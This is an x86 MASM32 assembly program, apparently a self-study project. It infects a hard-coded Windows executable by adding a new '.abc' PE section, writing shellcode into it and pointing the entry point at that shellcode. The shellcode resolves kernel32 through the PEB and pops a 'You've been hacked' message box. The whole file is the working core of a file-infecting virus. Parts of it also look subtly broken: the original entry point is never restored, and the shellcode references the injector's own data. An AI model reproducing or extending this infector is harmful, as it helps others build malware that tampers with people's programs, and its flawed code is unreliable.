;EasyCodeName=Project1,1
.386
Option CaseMap:None

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
IncludeLib \masm32\ lib\ masm32.lib

Extrn printf:Near
Extrn exit:Near
Extrn getchar:Near

SIZEOF_IMAGE_FILE_HEADER 			Equ 14H
SIZEOF_NT_SIGNATURE 				Equ SizeOf DWord
SIZEOF_OPTIONAL_HEADER 				Equ 224
MB_OK 								Equ 0H
IMAGE_SCN_MEM_READ_CODE_EXECUTE		Equ 60000020H

.Data
    	caption 	DB "Test", 0
message 		DB "You've been hacked", 0
    	filePath        DB  "C:\\Users\\Avenger\\Desktop\\Test\\DXCpl.exe", 0
    	errorMsg        DB  "Error occurred while processing the file.", 0
    	exitMsg         DB  "Press enter to exit the program....", 0
    	len = $ -exitMsg
    	dword_msg       DB  "0x%X", 0
    	sectionName	DB	".abc", 0
    	sectionNameSize Equ SizeOf sectionName
    	newline         DB  13, 10, 0
    	NT_Header       DD ?
    	fileHandle 	HANDLE 0
    	fileMapping 	HANDLE 0
    	viewOfFile 	PVOID 0

.data?
    	OptionalHeader      	DD ?
    	AddressOfEntryPoint 	DD ?
    	imageBase           	DD ?
    	NumberOfSections   	DW ?
    	BytesWritten        	DD ?
    	JmpBackEntryPoint	DD ?
    	fileAlignment		DD ?
    	sectionAlignment	DD ?
    	sizeOfImage		DD ?

    	newSection IMAGE_SECTION_HEADER<>
    	lastSection IMAGE_SECTION_HEADER <>

.Code
start:
    	; Get the handle to the PE file
    	invoke CreateFile, addr filePath, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL
    	; Check if file handle is valid
    	cmp eax, INVALID_HANDLE_VALUE
    	je  error_exit
    	Mov fileHandle, Eax 					; eax = file handle
    	; Map the file into memory
    	Push Eax
    	Invoke CreateFileMapping, fileHandle, NULL, PAGE_READWRITE, 0, 0, NULL
    	; Check if mapping handle is valid
    	cmp eax, NULL
    	je  error_exit
    	Mov Ecx, Eax 						; ecx = mapping handle
    	Mov fileMapping, Eax

    	; Get the address of the mapped file
    	invoke MapViewOfFile, ecx, FILE_MAP_WRITE, 0, 0, 0
    	; Check if mapping address is valid
    	cmp eax, NULL
    	je  error_exit
    	Mov Ebx, Eax 						; ebx = base address of the mapped file
    	Mov viewOfFile, Eax

    	Mov Edi, Ebx
    	Add Edi, [Edi + 3CH]
    	Mov NT_Header, Edi					; Save the offset of NT_Header from edi register

    	Mov Ebx, Edi
    	Add Ebx, 18H						; Move to OptionalHeader
    	Mov OptionalHeader, Ebx
    	Mov Esi, DWord Ptr [OptionalHeader]
    	Add Esi, 1CH                        ; Move to the ImageBase field
    	Mov Ecx, [Esi]
    	Mov imageBase, Ecx

    	Add Esi, 4H						; Move to SectionAlignment field
    	Mov Ecx, [Esi]
    	Mov sectionAlignment, Ecx

    	Add Esi, 4H
    	Mov Ecx, [Esi]
    	Mov fileAlignment, Ecx					; Move to FileAlignment field

    	Add Esi, 14H						; Move to SizeOfImage field
    	Mov Ecx, [Esi]
    	Mov sizeOfImage, Ecx

    	Mov Ecx, [Ebx + 10H]      ; Get the AddressOfEntryPoint
    	Mov AddressOfEntryPoint, Ecx
    	Xor Eax, Eax
    	Mov Eax, AddressOfEntryPoint
    	Add Eax, imageBase					; JmpBackEntryPoint = AddressOfEntryPoint + imageBase
    	Mov JmpBackEntryPoint, Eax

    	; Calculate the offset of the last section's raw data from the beginning of the file
    	Mov Esi, DWord Ptr [NT_Header]				; Get the pointer to the NT Header
    	Add Esi, 6H                                 		; Move to the NumberOfSections field
    	Xor Eax, Eax
    	Mov Eax, [Esi]                              		; Load the number of sections
    	Mov NumberOfSections, Ax
    	Sub Ax, 1
	Mov Edi, DWord Ptr [OptionalHeader]
	Add Edi, SIZEOF_OPTIONAL_HEADER
	Mov Bx, 40
	IMul Ax, Bx
	Movzx Eax, Ax
	Add Edi, Eax						; File pointer point to the last section in the section table

	Add Edi, 8H						; Get the VirtualSize of the last section
	Mov Eax, [Edi]
	Mov lastSection.Misc.VirtualSize, Eax

	Add Edi, 4H						; Get the VirtualAddress of the last section
	Mov Eax, [Edi]
	Mov lastSection.VirtualAddress, Eax

	Add Edi, 4H
	Mov Eax, [Edi]
	Mov lastSection.SizeOfRawData, Eax

	Add Edi, 4H
	Mov Eax, [Edi]
	Mov lastSection.PointerToRawData, Eax

; Shellcode
someStub:
	Assume Fs:Nothing
	Xor Eax, Eax
	Mov [Ebp - 4H], Eax					; This will store the number of exported function in ke, codeSize
	Mov [Ebp - 8H], Eax					; This will store the address of exported table
	Mov [Ebp - 0CH], Eax					; This will store the address of exported name table
	Mov [Ebp - 10H], Eax					; This will store the address of ordinal table
	Mov [Ebp - 14H], Eax

	Push 00007373H
	Push 65726464H
	Push 41636F72H
	Push 50746547H
	Mov [Ebp - 14H], Esp					; Push GetProcAddress

	Mov Eax, [Fs:30H]					; PEB
    	Mov Eax, [Eax + 0CH]					; PEB_LDR_DATA
    	Mov Eax, [Eax + 14H]					; InMemoryOrderModuleList
    	Mov Eax, [Eax]						; Get pointer to the second (ntdll.dll) entry in InMemoryOrderModuleList
    	Mov Eax, [Eax]						; Get pointer to the third (kernel32.dll) list in InMemoryOrderModuleList
   	Mov Eax, [Eax + 10H]
	Mov Ebx, Eax						; Store kernel32.dll base address in ebx

	Mov Eax, [Ebx + 3CH]
	Add Eax, Ebx						; PE signature

	Mov Eax, [Eax + 78H]
	Add Eax, Ebx						; Address of Export Table

	; Get number of exported functions
	Mov Ecx, [Eax + 14H]
	Add Ecx, Ebx
	Mov [Ebp - 4H], Ecx

	; Get address of functions
	Mov Ecx, [Eax + 1CH]
	Add Ecx, Ebx
	Mov [Ebp - 8H], Ecx

	; Get address of name table
	Mov Ecx, [Eax + 20H]
	Add Ecx, Ebx
	Mov [Ebp - 0CH], Ecx

	; Get address of ordinal table
	Mov Ecx, [Eax + 24H]
	Add Ecx, Ebx
	Mov [Ebp - 10H], Ecx

	Xor Eax, Eax						; Counter for loop
	Xor Ecx, Ecx

getFunctionPosition:
	Mov Esi, [Ebp - 14H]					; Name of Function
	Mov Edi, [Ebp - 0CH]					; Pointer points to the start of name table
	Mov Edi, [Edi + Eax * 4]				; RVA of next function name
	Add Edi, Ebx

	Mov Cx, 8
	Repe Cmpsb						; Compare edi, esi
	Jz getFunctionAddress					; If found the name then jump to getFunctionAddress
	Inc Eax
	Cmp Eax, [Ebp - 4H]					; Check for if counter < number of functions
	Jne getFunctionPosition ; Loop

; Calculate the ordinal of the function: (Address of ordinal table + position * sizeof(Ordinal))
; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
getFunctionAddress:
	Xor Ecx, Ecx
	Mov Ecx, [Ebp - 10H]					; Address of ordinal table
	Mov Edx, [Ebp - 8H]					; Address of function

	Mov Ax, [Ecx + Eax * 2]					; Get the function ordinal
	Mov Eax, [Edx + Eax * 4]
	Add Eax, Ebx						; Function address
	Jmp invokeFunction

; Using GetProcAddress to get the address of LoadLibraryA
invokeFunction:
	Xor Ecx, Ecx
	Xor Edx, Edx
	Mov Edx, Eax						; edx = GetProcAddress
	Mov [Ebp - 14H], Ecx
	Mov [Ebp - 14H], Edx
	Push Ebx						; Kernel32 base address
	Push Edx						; GetProcAddress
	Push Ecx
	Push 41797261H						; aryA
	Push 7262694CH						; Libr
	Push 64616F4CH						; Load
	Push Esp
	Push Ebx
	Call Edx						; Call GetProcAddress

	; The returned data is saved to eax register
	; Load User32.dll using LoadLibraryA
	Add Esp, 0CH						; Clear LoadLibraryA from the stack
	Xor Ecx, Ecx
	Push Eax						; LoadLibraryA address
	Push Ecx
	Mov Cx, 6C6CH						; ll
	Push Ecx
	Push 642E3233H						; 32.d
	Push 72657375H						; user
	Push Esp						; user32.dll
	Call Eax

	; Get MessageBoxA address
	Add Esp, 10H						; Clear user32.dll from the stack
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Push Eax						; user32.dll base address
	Push Edx						; GetProcAddress
	Push Ecx
	Mov Ecx, 6141786FH
	Push Ecx
	Sub DWord Ptr[Esp + 3H], 61H
	Push 42656761H
	Push 7373654DH
	Push Esp 						; MessageBoxA
	Push Eax						; user32.dll base address
	Call Edx						; GetProcAddress

	; Invoke MessageBoxA
	Push MB_OK
	Push Offset caption
	Push Offset message
	Push 0
	Call Eax
	codeSize = $ -someStub

	; Calculate new section information
	Mov newSection.Misc.VirtualSize, codeSize

	Mov Eax, IMAGE_SCN_MEM_READ_CODE_EXECUTE
	Mov newSection.Characteristics, Eax

	Mov Eax, lastSection.PointerToRawData
	Mov Ebx, lastSection.SizeOfRawData
	Add Eax, Ebx
	Mov newSection.PointerToRawData, Eax

	Mov Eax, sectionAlignment
	Dec Eax
	Mov Ebx, lastSection.Misc.VirtualSize
	Add Ebx, Eax
	Not Eax
	And Ebx, Eax
	Mov Eax, lastSection.VirtualAddress
	Add Ebx, Eax
	Mov newSection.VirtualAddress, Ebx

	Mov Eax, fileAlignment
	Dec Eax
	Mov Ebx, codeSize
	Add Ebx, Eax
	Not Eax
	And Ebx, Eax
	Mov newSection.SizeOfRawData, Ebx

	Mov Eax, 6362612EH
	Mov DWord Ptr [newSection.Name1], Eax

	Mov Ax, NumberOfSections
	Mov Edi, DWord Ptr [OptionalHeader]
	Add Edi, SIZEOF_OPTIONAL_HEADER
	Mov Bx, 40
	IMul Ax, Bx
	Movzx Eax, Ax
	Add Edi, Eax								; Move the pointer to the end of the section table
	Sub Edi, viewOfFile
	Invoke SetFilePointer, fileHandle, Edi, NULL, FILE_BEGIN
	Invoke WriteFile, fileHandle, Offset newSection, SizeOf newSection, Addr BytesWritten, NULL

	; Write the updated number of sections back to the file
    	Mov Esi, DWord Ptr [NT_Header]
    	Add Esi, 6H
    	Mov Eax, [Esi]      							; Move to the number of sections
    	Inc Eax             							; Increment the number of sections
    	Mov NumberOfSections, Ax 						; Load the updated value
    	Sub Esi, viewOfFile							; Get the actual offset on the disk
    	Invoke SetFilePointer, fileHandle, Esi, NULL, FILE_BEGIN ; Set file pointer to the location of NumberOfSections
    	Invoke WriteFile, fileHandle, Offset NumberOfSections, SizeOf Word, Addr BytesWritten, NULL ; Write the updated value

	; Modify the AddressOfEntryPoint
	Mov Eax, DWord Ptr [NT_Header]
	Add Eax, 28H
	Sub Eax, viewOfFile
	Invoke SetFilePointer, fileHandle, Eax, NULL, FILE_BEGIN
	Invoke WriteFile, fileHandle, Offset newSection.VirtualAddress, SizeOf DWord, Addr BytesWritten, NULL

	; Inject shellcode
	Mov Esi, newSection.PointerToRawData
	Invoke SetFilePointer, fileHandle, Esi, NULL, FILE_BEGIN
	Invoke WriteFile, fileHandle, someStub, newSection.SizeOfRawData, Addr BytesWritten, NULL

	; Update size of image and roundit up with section alignment
	Mov Eax, sectionAlignment
	Mov Ebx, codeSize
	Dec Eax
	Add Ebx, Eax
	Not Eax
	And Ebx, Eax
	Mov Eax, sizeOfImage
	Add Ebx, Eax
	Mov sizeOfImage, Ebx
	Mov Eax, DWord Ptr [OptionalHeader]
	Add Eax, 38H
	Sub Eax, viewOfFile
	Invoke SetFilePointer, fileHandle, Eax, NULL, FILE_BEGIN
	Invoke WriteFile, fileHandle, Offset sizeOfImage, SizeOf DWord, Addr BytesWritten, NULL

	; Set EndOfFile
	Mov Eax, newSection.PointerToRawData
	Mov Ebx, newSection.SizeOfRawData
	Add Eax, Ebx
	Sub Eax, viewOfFile
	Invoke SetFilePointer, fileHandle, Eax, NULL, FILE_BEGIN
	Invoke SetEndOfFile, fileHandle

    	; Cleanup and exit
    	Invoke UnmapViewOfFile, Ebx
    	Invoke CloseHandle, fileHandle
    	Invoke CloseHandle, Edx
    	Jmp exit_program

error_exit:
    	Push Offset errorMsg
    	Call printf

exit_program:
    	Call getchar
    	Invoke ExitProcess, 0

End start

